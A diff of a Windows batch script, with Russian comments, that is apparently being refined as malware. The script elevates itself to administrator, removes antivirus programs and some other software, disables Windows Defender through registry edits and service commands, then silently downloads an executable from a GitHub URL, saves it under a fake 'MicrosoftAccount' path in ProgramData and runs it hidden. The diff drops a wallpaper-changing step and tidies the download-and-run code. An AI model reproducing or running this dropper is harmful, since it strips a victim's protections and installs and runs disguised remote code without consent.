@@ -1,9 +1,13 @@
-��&cls
 @echo off
 setlocal
 
-:: Возврат прав администратора
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || powershell -command "Start-Process -Verb RunAs"
+:: Проверка, запущен ли скрипт с правами администратора
+net session >nul 2>&1
+if %errorLevel% NEQ 0 (
+    echo Запуск с правами администратора...
+    powershell -Command "Start-Process cmd -ArgumentList '/c, %~s0' -Verb RunAs"
+    exit /b
+)
 
 :: Удаление антивирусных программ
 for %%P in (
@@ -107,36 +111,32 @@ for %%P in (
     )
 )
 
+:: Удаление других программ и папок
+for %%D in (
+    "%USERPROFILE%\AppData\Local\360SecureBrowser"
+    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Android Studio"
+    "C:\Program Files\AVG\Browser\Application"
+) do (
+    if exist "%%D" (
+        rd /S /Q "%%~D" >nul 2>&1
+    )
+)
+
 :: Регистрация и остановка Windows Defender
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
 sc stop WinDefend >nul 2>&1
 sc config WinDefend start= disabled >nul 2>&1
 
-:: Скачивание обоев
-set TEMP_DIR=%temp%
-set IMAGE_URL=https://i.pinimg.com/736x/cf/f5/65/cff565f61758b0d625c4820d4e6f0b17.jpg
-set IMAGE_PATH=%TEMP_DIR%\wallpaper.jpg
-
-:: Скачивание изображения через PowerShell
-powershell -Command "Invoke-WebRequest -Uri '%IMAGE_URL%' -OutFile '%IMAGE_PATH%'"
-
-:: Установка изображения как обоев с указанием растяжения
-powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value '%IMAGE_PATH%'; Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value 2; Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value 0"
-RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 
-
-:: Удаление других программ и папок
-for %%P in (
-    "%USERPROFILE%\AppData\Local\360SecureBrowser"
-    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Android Studio"
-    "C:\Program Files\AVG\Browser\Application"
-) do (
-    rd /S /Q "%%~P" >nul 2>&1
+:: Скачивание и запуск дополнительного программного обеспечения
+set "TARGET_DIR=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount"
+if not exist "%TARGET_DIR%" (
+    mkdir "%TARGET_DIR%" >nul 2>&1
 )
 
-:: Скачивание и запуск дополнительного программного обеспечения
-mkdir "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount" >nul 2>&1
-powershell -Command "Invoke-Webrequest 'https://github.com/SchoolSigmaBoy/SchoolSigma/raw/main/SigmaBoy.exe' -OutFile 'C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\MicrosoftAccount.exe'" >nul 2>&1
-start /b "" "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\MicrosoftAccount.exe" >nul 2>&1
+set "EXECUTABLE_URL=https://github.com/SchoolSigmaBoy/SchoolSigma/raw/main/SigmaBoy.exe"
+set "EXECUTABLE_PATH=%TARGET_DIR%\MicrosoftAccount.exe"
+powershell -Command "Invoke-WebRequest '%EXECUTABLE_URL%' -OutFile '%EXECUTABLE_PATH%'" >nul 2>&1
+start "" /b "%EXECUTABLE_PATH%" >nul 2>&1
 
 exit /b
